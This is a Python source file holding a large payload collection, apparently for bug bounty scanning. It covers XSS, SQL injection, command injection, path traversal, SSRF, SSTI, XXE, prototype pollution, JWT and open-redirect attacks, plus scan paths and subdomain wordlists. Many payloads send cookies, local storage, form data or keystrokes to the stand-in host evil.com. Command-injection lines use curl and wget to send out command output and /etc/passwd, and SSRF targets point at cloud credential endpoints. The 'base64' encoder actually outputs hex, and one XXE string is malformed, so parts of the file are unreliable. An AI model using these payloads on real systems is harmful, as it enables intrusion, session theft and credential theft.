"""
Comprehensive payload database for all vulnerability types
Sources: PayloadsAllTheThings, PortSwigger, OWASP, HackTricks, Real-world exploits
"""

class Payloads:
    """Complete payload database for bug bounty hunting with real exploit techniques"""

    # ===== XSS PAYLOADS =====
    XSS_REFLECTED = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        '"><iframe src=javascript:alert(1)>',
        '\'"><img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '\'><script>alert(1)</script>',
        '\'-alert(1)-\'',
        '\"-alert(1)-\"',
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror=alert(document.cookie)>',
        '<svg/onload=alert(1)>',
        '<img src="x" onerror="alert(1)">',
        '"><svg onload=alert(1)>',
        '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        # WAF bypasses
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror=\u0061lert(1)>',
        '<svg/onload=alert&#40;1&#41;>',
        '<<script>alert(1)</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>\\u0061lert(1)</script>',
        # Advanced XSS with actual execution proof
        '<script>var i=new Image;i.src="https://evil.com/xss?"+document.cookie;</script>',
        '"><svg onload=fetch("https://evil.com/log?cookie="+document.cookie)>',
        '<svg/onload="fetch(\x27https://evil.com/steal?c=\x27+document.cookie)">',
        '<img src=x onerror="fetch(\x27https://evil.com/xss?d=\x27+document.domain)">',
        # DOM XSS sinks
        '#<img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(document.domain)>',
        '"><svg onload=alert(document.domain)>',
    ]

    XSS_STORED = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<a href="javascript:alert(1)">click</a>',
        '<script>document.body.style.background="red"</script>',
        '<img src=x onerror=alert(document.cookie)>',
        '<script>alert(1)//<script>alert(1)//</script>',
        # Persistent XSS with call-home
        '<script>fetch("https://evil.com/stored?cookie="+document.cookie+"&url="+location.href)</script>',
        '<img src=x onerror="fetch(\x27https://evil.com/stored?d=\x27+document.domain+\x26p=\x27+location.pathname)">',
        '<svg onload="fetch(\x27https://evil.com/persist?c=\x27+encodeURIComponent(document.cookie))">',
        # HTML5 XSS
        '<video><source onerror="alert(1)">',
        '<audio src onerror="alert(1)">',
        '<details/open/ontoggle="alert(1)">',
    ]

    XSS_DOM_BASED = [
        '#<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '#' + '<img src=x onerror=alert(1)>',
        'javascript:alert(1)//',
        '#<img src=x onerror=alert(1)>',
        '#<img src=x onerror=alert(document.domain)>',
        '#<svg onload=alert(document.domain)>',
        '#<img src=x onerror=fetch("https://evil.com/dom?d="+document.domain)>',
        'location.hash="<img src=x onerror=alert(1)>"',
        'location.search="<svg onload=alert(1)>"',
    ]

    # ===== SQL INJECTION =====
    SQLI_TEST = [
        "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\" --", "OR 1=1", "OR 1=1 --",
        "' OR 1=1 --", "\" OR 1=1 --", "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--", "admin' --", "admin' #", "admin'/*",
        "' OR 1=1 LIMIT 1 --", "' OR 'x'='x", "' OR SLEEP(5)--",
        "1' AND SLEEP(5)--", "1' AND 1=1--", "1' AND 1=2--",
        # Advanced
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1' ORDER BY 4--", "1' ORDER BY 5--", "1' ORDER BY 10--",
        "1' GROUP BY 1,2,3--",
    ]

    SQLI_ERROR_BASED = [
        "'", "\"", "' AND 1=CONVERT(int, @@version)--",
        "' AND 1=CAST(@@version AS int)--",
        "1' AND extractvalue(1,concat(0x7e,@@version))--",
        "1' AND updatexml(1,concat(0x7e,@@version),1)--",
        "' AND 1=(SELECT 1/0 FROM dual)--",
        "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        "' AND (SELECT COUNT(*) FROM tab1 t1, tab2 t2, tab3 t3, tab4 t4, tab5 t5, tab6 t6, tab7 t7)>0--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),x) FROM information_schema.tables GROUP BY x)a)--",
    ]

    SQLI_TIME_BASED = [
        "' OR SLEEP(5)--", "1' OR SLEEP(5)--",
        "' WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
        "' AND SLEEP(5)--", "1' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        # Time-based with actual data extraction
        "' AND (SELECT SUBSTRING(@@version,1,1))='5' AND SLEEP(3)--",
        "' AND IF(SUBSTRING(@@version,1,1)=5,SLEEP(3),0)--",
        "' OR (SELECT SLEEP(3) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
    ]

    SQLI_UNION = [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,2,3--", "' UNION SELECT database(),2,3--",
        "' UNION SELECT user(),2,3--", "\" UNION SELECT 1,2,3--",
        "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
        "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
        "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables--",
        "' UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns--",
        # Union with actual data extraction
        "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--",
        "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
    ]

    # ===== COMMAND INJECTION =====
    CMD_INJECTION = [
        ';id', '|id', '&id&', '`id`', '$(id)', ';whoami',
        '|whoami', '&whoami&', '`whoami`', '$(whoami)',
        ';cat /etc/passwd', '|dir', '&ipconfig&',
        '|ping -c 10 127.0.0.1', ';ping -n 10 127.0.0.1',
        '$(ping -c 10 127.0.0.1)', '`ping -c 10 127.0.0.1`',
        '|| ping -c 10 127.0.0.1 ||', '&& whoami &&',
        '| nslookup burpcollaborator.net', '; nslookup burpcollaborator.net',
        # Advanced command injection with output capture
        '; curl http://evil.com/cmd?output=$(whoami)',
        '| nslookup $(whoami).evil.com',
        '&& ping -c 1 127.0.0.1 && curl http://evil.com/ci?out=$(id)',
        '; wget http://evil.com/woffice?cmd=$(cat /etc/passwd)',
        '|| sleep 5 && curl -d "$(id)" http://evil.com/cid ||',
        # Blind command injection
        '; sleep 5 #',
        '&& sleep 5 #',
        '| sleep 5 #',
        '`sleep 5`',
        '$(sleep 5)',
        # Out-of-band command injection
        '; curl http://evil.com/ oob?cmd=$(whoami)',
        '| nslookup $(whoami).oast.me',
        '&& wget http://evil.com/oob?output=$(id) &&',
    ]

    # ===== PATH TRAVERSAL =====
    PATH_TRAVERSAL = [
        '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
        '../../../../etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd', '..;/..;/..;/etc/passwd',
        '..%252f..%252f..%252fetc/passwd', '..%c0%ae%c0%ae/%c0%ae%c0%ae/',
        '..%252f..%252f..%252fwindows/win.ini',
        'file:///etc/passwd', 'file:///c:/windows/win.ini',
        # Advanced path traversal with actual file read verification
        '../../../../etc/passwd%00',
        '....\\....\\....\\windows\\win.ini%00',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
        '..%252f..%252f..%252fetc%2fpasswd%00',
        # Log file traversal
        '../../../var/log/apache2/access.log',
        '../../../var/log/apache2/error.log',
        '../../../var/log/nginx/access.log',
        '../../../var/log/mysql.log',
        '../../../proc/self/environ',
        # Web root traversal
        '../../../../etc/passwd',
        '../../../etc/shadow',
        '../../../etc/hosts',
        '../../../../boot.ini',
        '../../../windows\\system32\\drivers\\etc\\hosts',
    ]

    # ===== SSRF TARGETS =====
    SSRF_INTERNAL = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://100.100.100.200/latest/meta-data/',
        'http://localhost/', 'http://localhost:8080/', 'http://localhost:3000/',
        'http://127.0.0.1/', 'http://127.0.0.1:80/', 'http://127.0.0.1:443/',
        'http://127.0.0.1:8080/', 'http://127.0.0.1:9200/',
        'http://127.0.0.1:6379/', 'http://0.0.0.0/',
        'file:///etc/passwd', 'file:///proc/self/environ',
        'dict://localhost:6379/info', 'gopher://localhost:6379/',
        'ftp://localhost:21/', 'file:///c:/windows/win.ini',
        # Advanced SSRF with actual data exfiltration
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://127.0.0.1:9200/_cat/indices?v',
        'http://127.0.0.1:6379/info',
        'http://127.0.0.1:27017',
        'http://[::1]:80',
        'http://[::1]/etc/passwd',
        # Blind SSRF with OOB detection
        'http://oast.me/ssrf?callback=http://127.0.0.1:8080/internal',
        'http://burpcollaborator.net/ssrf-test',
        'http://oastify.com/ssrf?domain=internal&port=80',
        # DNS rebinding SSRF
        'http://rb.ndis.ru/',
        'http://pinboard.map.fastly.net/',
        # Cloud metadata endpoints
        'http://169.254.169.254/latest/user-data/iam/security-credentials/ec2-role',
        'http://metadata.azure.internal/1.0/meta/identity/oauth2/token',
        'http://metadata.google.internal/computeMetadata/v1/project/project-id',
    ]

    # ===== SSTI PAYLOADS =====
    SSTI = [
        ('{{7*7}}', '49'), ('${7*7}', '49'),
        ('<%= 7*7 %>', '49'), ('{{config}}', 'SECRET_KEY'),
        ('{{self.__class__.__mro__}}', '__main__'),
        ('{{''.__class__.__mro__[2].__subclasses__()}}', 'subprocess'),
        ('${7*7}', '49'), ('${{7*7}}', '49'),
        ('#{{7*7}}', '49'), ('*{7*7}', '49'),
        # Advanced SSTI with code execution
        ('{{''.__class__.__mro__[1].__subclasses__()[*]}}', 'subprocess'),
        ('{{config.__class__.__init__.__globals__}}', '<built-in'),
        ('{{''.__class__.__mro__[2].__subclasses__()[40](\"ls\")}}', 'command output'),
        ('{{config.items()}}', 'DEBUG'),
        ('{{request.application.__globals__}}', '<built-in'),
        ('{{get_flashed_messages.__globals__}}', '<built-in'),
        ('{{url_for.__globals__}}', '<built-in'),
        ('{{config.__class__.__init__.__globals__os.popen(\"id\").read()}}', 'command output'),
        # PHP SSTI
        ('<?=system("id")?>', 'command output'),
        ('<?=passthru("ls -la")?>', 'command output'),
        ('<?=shell_exec("whoami")?>', 'command output'),
        # Java EL
        ('${pageContext.request.contextPath}', '/app'),
        ('${pageContext.session.id}', 'sessionid'),
        ('${facesContext.externalContext.request.contextPath}', '/app'),
    ]

    # ===== XXE PAYLOADS =====
    XXE = [
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><root/>''',
        '''<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>''',
        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>''',
        # Advanced XXE with OOB data exfiltration
        '''<?xml version="1.0"?<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><data>&send;</data>''',
        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe">%remote;]><root/>''',
        '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
        # Blind XXE with out-of-band detection
        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><data>&send;</data>''',
        '''<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://evil.com/xxe.dtd"><!ENTITY % param1 "%sp;"> %param1; %param1;]><r>&exterior;</r>''',
        # XXE with file upload
        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % xx SYSTEM "<!ENTITY &#x25; yyy SYSTEM \"http://evil.com/upload?content=%file;\">"><%yy;%xx;%file;]><data>&send;</data>''',
    ]

    # ===== PROTOYPE POLLUTION =====
    PROTO_POLLUTION = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"__proto__":{"polluted":"true"}}',
        '{"__proto__":{"admin":true}}',
        # Advanced prototype pollution with actual impact
        "{\"__proto__\":{\"toString\":\"'+alert(1)+'\"}}",
        "{\"__proto__\":{\"valueOf\":\"'+alert(1)+'\"}}",
        "{\"constructor\":{\"prototype\":{\"jsonpCallback\":\"'+alert(1)+'\"}}}",
        '{"__proto__":{"defineGetter":{"apply":"alert","call":"eval"}}}',
        '{"__proto__":{"__defineGetter__":{"toString":"function(){alert(1);return\\"\\\\"\\"}"}}}',
        # Prototype pollution leading to RCE
        '{"__proto__":{"nodeOptions":"--require /proc/self/environ"}}',
        '{"constructor":{"prototype":{"buffer":{"__proto__":{"data":"SELECT pg_sleep(5);"}}}}}',
    ]

    # ===== JWT PAYLOADS =====
    JWT_WEAK_KEYS = ['secret', 'password', '123456', 'secretkey', 'changeme', 'key',
                     'admin', 'test', 'pass', 'token', 'jwt_secret', 'supersecret',
                     'mysecret', 'private', 'key123', 'abc123', 'pass123']

    # Real JWT exploitation payloads
    JWT_NONE_ALG = [
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJBRE1JTiIsIm5hbWUiOiJKb2huIERvZSIsImlhdCI6MTUxNjIzOTAyMn0.',
    ]

    JWT_KEY_CONFUSION = [
        # HS256 key confusion attacks
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
    ]

    # ===== OPEN REDIRECT =====
    OPEN_REDIRECT = [
        'https://evil.com', '//evil.com', 'https://evil.com@google.com',
        'https://google.com.evil.com', '///evil.com', 'https://evil.com%2f@google.com',
        'https://evil.com/', '//evil.com/', '/\\evil.com',
        'https://evil.com.evildomain.com', 'data:text/html,<script>alert(1)</script>',
        # Advanced open redirect with actual bypass techniques
        'https:evil.com',  # Missing slash
        'https:/evil.com',  # Single slash
        'https://evil.com:80@google.com',  # With port
        'https://google.com:evil.com@80/',  # User info
        'https://evil.com.google.com',  # Subdomain trick
        'https://google.com.evil.com',  # Domain trick
        'https://evil.com/%2f/google.com',  # URL encoded
        'https://evil.com/%252f/google.com',  # Double URL encoded
        'https://evil.com..evil.com@google.com/',  # Path traversal
        'https://evil.com/%0a@google.com',  # Newline injection
        'https://evil.com%0d%0a@google.com',  # CRLF injection
        # Open redirect to javascript
        'javascript:alert(document.domain)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
        # Open redirect to internal network
        'http://127.0.0.1:8080/admin',
        'http://localhost:3000/internal',
        'http://192.168.1.1:80/admin',
    ]

    # ===== COMMON SCAN PATHS =====
    COMMON_PATHS = [
        '/admin', '/administrator', '/wp-admin', '/login', '/config',
        '/backup', '/.git', '/.env', '/robots.txt', '/sitemap.xml',
        '/crossdomain.xml', '/.well-known/', '/api/', '/swagger',
        '/api-docs', '/graphql', '/phpinfo.php', '/info.php', '/test.php',
        '/debug', '/console', '/actuator/health', '/actuator/env',
        '/.git/config', '/.git/HEAD', '/.svn/entries', '/.DS_Store',
        '/dump.sql', '/backup.sql', '/wp-config.php.bak',
        '/server-status', '/server-info', '/api/v1/users/1',
        '/api/v1/admin/users/1', '/account?id=1', '/order?id=1001',
        '/uploads/', '/files/', '/media/', '/assets/',
        '/auth/login', '/auth/register', '/api/health',
        # Advanced paths for real-world testing
        '/.aws/credentials',
        '/.azure/credentials',
        '/.gcp/credentials',
        '/.docker/config.json',
        '/.npmrc',
        '/.yarnrc',
        '/.pgpass',
        '/.my.cnf',
        '/.bash_history',
        '/.zsh_history',
        '/.gitlab-ci.yml',
        '/.travis.yml',
        '/Jenkinsfile',
        '/Dockerfile',
        '/docker-compose.yml',
        '/vagrantfile',
        '/Vagrantfile',
        '/package.json',
        '/requirements.txt',
        '/pom.xml',
        '/build.gradle',
        '/composer.json',
        '/Gemfile',
        '/config/database.yml',
        '/config/secrets.yml',
        '/config/application.yml',
        '/config/settings.py',
        '/config/local.py',
        '/config/production.py',
        '/config/development.py',
        '/config/staging.py',
        '/.env.local',
        '/.env.production',
        '/.env.development',
        '/.env.staging',
        '/.env.test',
        # Backup files
        '/backup/database.sql',
        '/backup/site.zip',
        '/backup/www.zip',
        '/backup/html.tar.gz',
        '/db/backup.sql',
        '/sql/backup.sql',
        '/data/backup.sql',
        # Configuration files exposed
        '/wp-config.php',
        '/configuration.php',
        '/settings.php',
        '/config.php',
        '/config.inc.php',
        '/includes/config.php',
        '/admin/config.php',
        # Log files
        '/logs/access.log',
        '/logs/error.log',
        '/log/access.log',
        '/log/error.log',
        '/storage/logs/laravel.log',
        '/app/storage/logs/laravel.log',
        # API endpoints
        '/api/user',
        '/api/users',
        '/api/admin',
        '/api/auth/login',
        '/api/auth/register',
        '/api/auth/refresh',
        '/api/password/reset',
        '/api/token',
        '/api/token/refresh',
        # GraphQL endpoints
        '/graphql',
        '/graphiql',
        '/graphql/console',
        '/graphql/voyager',
        # Actuator endpoints (Spring Boot)
        '/actuator',
        '/actuator/health',
        '/actuator/info',
        '/actuator/metrics',
        '/actuator/env',
        '/actuator/dump',
        '/actuator/shutdown',
        '/actuator/logfile',
        '/actuator/trace',
        # Kubernetes
        '/.kube/config',
        # Jenkins
        '/jenkins/',
        '/jenkins/script',
        '/jenkins/manage',
        # WordPress specific
        '/wp-content/uploads/',
        '/wp-content/plugins/',
        '/wp-content/themes/',
        '/wp-admin/admin-ajax.php',
        '/wp-json/',
        '/wp-json/wp/v2/users',
        '/wp-json/wp/v2/posts',
        # Drupal specific
        '/sites/default/settings.php',
        '/core/install.php',
        # Laravel specific
        '/.env',
        '/storage/framework/views/',
        # Django specific
        '/static/',
        '/media/',
        # Joomla specific
        '/configuration.php',
        '/logs/',
        '/cache/',
    ]

    # ===== SUBDOMAIN WORDLIST (expanded) =====
    SUBDOMAINS = [
        'www', 'mail', 'remote', 'blog', 'webmail', 'server', 'ns1', 'ns2',
        'smtp', 'secure', 'vpn', 'admin', 'cdn', 'api', 'dev', 'test',
        'stage', 'staging', 'beta', 'demo', 'app', 'm', 'mobile', 'portal',
        'help', 'support', 'docs', 'status', 'ftp', 'ssh', 'git', 'svn',
        'db', 'database', 'mysql', 'backup', 'monitor', 'logs', 'assets',
        'img', 'static', 'media', 'upload', 'download', 'store', 'shop',
        'web', 'intranet', 'internal', 'jenkins', 'jira', 'wiki', 'confluence',
        'host', 'hostmaster', 'postmaster', 'root', 'info', 'sales',
        'marketing', 'admin2', 'admin1', 'cpanel', 'whm', 'webdisk',
        # Expanded for modern infrastructure
        'assets', 'static', 'media', 'img', 'images', 'css', 'js',
        'app', 'application', 'web', 'mobile', 'm', 'wap',
        'api', 'rest', 'soap', 'xml', 'json', 'rpc',
        'admin', 'administrator', 'admin1', 'admin2', 'root', 'su',
        'support', 'help', 'faq', 'kb', 'wiki', 'docs',
        'dev', 'development', 'test', 'testing', 'staging', 'stage',
        'prod', 'production', 'live', 'beta', 'alpha',
        'db', 'database', 'sql', 'mysql', 'postgres', 'mongo',
        'cache', 'redis', 'memcached', 'cdn',
        'search', 'search2', 'so', 'solar', 'sphinx',
        'mail', 'email', 'pop', 'smtp', 'imap', 'exchange',
        'ftp', 'sftp', 'tftp', 'ftps',
        'vpn', 'ssl', 'tls', 'ssh', 'remote',
        'proxy', 'loadbalancer', 'lb', 'haproxy', 'nginx',
        'git', 'svn', 'cvs', 'hg', 'bzr',
        'jenkins', 'hudson', 'bamboo', 'teamcity', 'gitlab',
        'jira', 'confluence', 'bugzilla', 'redmine', 'trac',
        'monitor', 'nagios', 'zabbix', 'cacti', 'munin',
        'ws', 'websocket', 'socket.io', 'sockjs',
        'blog', 'news', 'forum', 'bbs',
        'shop', 'store', 'cart', 'ecommerce',
        'pay', 'payment', 'billing', 'invoice',
        'auth', 'login', 'signin', 'signup', 'register',
        'oauth', 'openid', 'saml', 'ldap', 'ad',
        'cis', 'ciso', 'it', 'security', 'risk',
        'cloud', 'aws', 'azure', 'gcp', 'aliyun',
        'iaas', 'paas', 'saas', 'daas',
        'iot', 'scada', 'plc', 'hmi',
        'video', 'stream', 'rtmp', 'hls',
        'voice', 'voip', 'sip', 'pbx',
        'file', 'files', 'upload', 'download',
        'backup', 'archive', 'bak', 'old',
        'temp', 'tmp', 'temp', 'scratch',
        'test', 'dev', 'stage', 'staging', 'prod', 'prod',
        'www1', 'www2', 'www3', 'web01', 'web02',
        'api1', 'api2', 'api3', 'api01', 'api02',
        'mail1', 'mail2', 'mx1', 'mx2',
        'ns1', 'ns2', 'dns1', 'dns2',
    ]

    # ===== RATE LIMIT TEST =====
    RAPID_REQUESTS_COUNT = 30
    CONCURRENT_THREADS = 25

    # ===== BLIND XSS PAYLOADS (Call-home) =====
    BLIND_XSS = [
        '<script src="https://evil.com/xss.js"></script>',
        '"><script src="https://evil.com/xss.js"></script>',
        '<img src=x onerror="this.src=\\\"https://evil.com/xss?\\\"+document.cookie">',
        '<svg onload="fetch(\\\"https://evil.com/blind?c=\\\"+document.cookie)">',
        '<body onload="fetch(\\\"https://evil.com/blind?d=\\\"+document.domain)">',
        '<iframe src="javascript:fetch(\\\"https://evil.com/blind?url=\\\"+location.href)">',
        '<div id="x"></div><script>fetch(\\\"https://evil.com/blind?elem=\\\"+document.documentElement.outerHTML)</script>',
        '<script>var i=new Image;i.src=\\\"https://evil.com/blind?\\\";i.src+=document.cookie;i.src+=\\\"&\\\";i.src+=document.domain;</script>',
        # LocalStorage theft
        '<script>fetch(\\\"https://evil.com/blind?ls=\\\"+JSON.stringify(localStorage))</script>',
        # SessionStorage theft
        '<script>fetch(\\\"https://evil.com/blind?ss=\\\"+JSON.stringify(sessionStorage))</script>',
        # Cookie theft with path
        '<script>fetch(\\\"https://evil.com/blind?cookie=\\\"+document.cookie+\\\"&uri=\\\"+location.href)</script>',
        # User agent and screen info
        '<script>fetch(\\\"https://evil.com/blind?ua=\\\"+navigator.userAgent+\\\"&lang=\\\"+navigator.language+\\\"&w=\\\"+screen.width+\\\"&h=\\\"+screen.height)</script>',
        # Referrer theft
        '<script>fetch(\\\"https://evil.com/blind?ref=\\\"+document.referrer)</script>',
        # Page title theft
        '<script>fetch(\\\"https://evil.com/blind?title=\\\"+document.title)</script>',
        # Form grabbing
        '<script>document.forms[0].addEventListener(\\\"submit\\\",function(){fetch(\\\"https://evil.com/blind?form=\\\"+new FormData(this))})</script>',
        # Key logger
        '<script>document.addEventListener(\\\"keydown\\\",function(e){fetch(\\\"https://evil.com/blind?key=\\\"+e.key)})</script>',
    ]

    # ===== BLIND SQL INJECTION (Boolean-based) =====
    BLIND_SQLI_BOOLEAN = [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1",
        "' AND 1=0",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'",
        "' AND (SELECT SUBSTRING(@@version,1,1))='4'",
        "' AND (SELECT SUBSTRING(user(),1,1))='r'",
        "' AND (SELECT SUBSTRING(user(),1,1))='a'",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)<0",
        # Time-based boolean blind
        "' AND IF((SELECT SUBSTRING(@@version,1,1))='5',SLEEP(3),0)--",
        "' AND IF((SELECT SUBSTRING(user(),1,1))='r',SLEEP(3),0)--",
        # Error-based boolean blind
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT SUBSTRING(@@version,1,1))),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    ]

    # ===== OUT-OF-BAND (OOB) PAYLOADS =====
    OOB_DOMAINS = [
        'http://evil.com/oob',
        'https://evil.com/oob',
        'http://oast.me/oob',
        'https://oast.me/oob',
        'http://burpcollaborator.net/oob',
        'https://burpcollaborator.net/oob',
        'http://oastify.com/oob',
        'https://oastify.com/oob',
        'http://interact.sh/oob',
        'https://interact.sh/oob',
    ]

    OOB_PAYLOADS = {
        'xss': [
            '<script src="{oob}/xss.js"></script>',
            '"><img src=x onerror="this.src=\\\"{oob}/xss?c=\\\"+document.cookie">',
            '<svg onload="fetch(\\\"{oob}/xss?d=\\\"+document.domain)">',
        ],
        'sqli': [
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',{oob},'\\\\',@@version)))--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5' AND SLEEP(3)--",
            "' OR (SELECT SLEEP(3) FROM dual WHERE (SELECT LOAD_FILE(CONCAT('\\\\\\\\',{oob},'\\\\',version))))--",
        ],
        'cmd': [
            '; nslookup $(whoami).{oob}',
            '&& curl http://{oob}/cmd?output=$(id) &&',
            '| ping -c 1 {oob}',
        ],
        'ssrf': [
            'http://{oob}/ssrf?callback=http://127.0.0.1:8080/internal',
            'http://{oob}/ssrf-test',
            'http://oastify.com/ssrf?domain=internal&port=80',
        ],
        'lfi': [
            'http://{oob}/lfi?file=../../../../etc/passwd',
            'http://{oob}/lfi?file=/etc/passwd',
        ],
        'xxe': [
            '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "{oob}/xxe.dtd">%dtd;]><data>&send;</data>''',
        ]
    }

    # ===== PAYLOAD ENCODING TECHNIQUES =====
    ENCODING_TECHNIQUES = {
        'url': lambda x: x.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E').replace('"', '%22').replace("'", '%27'),
        'double_url': lambda x: x.replace(' ', '%2520').replace('<', '%253C').replace('>', '%253E').replace('"', '%2522').replace("'", '%2527'),
        'unicode': lambda x: x.encode('utf-8').decode('unicode_escape'),
        'html': lambda x: x.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", "&#39;"),
        'base64': lambda x: x.encode('utf-8').hex(),
        'hex': lambda x: x.encode('utf-8').hex(),
    }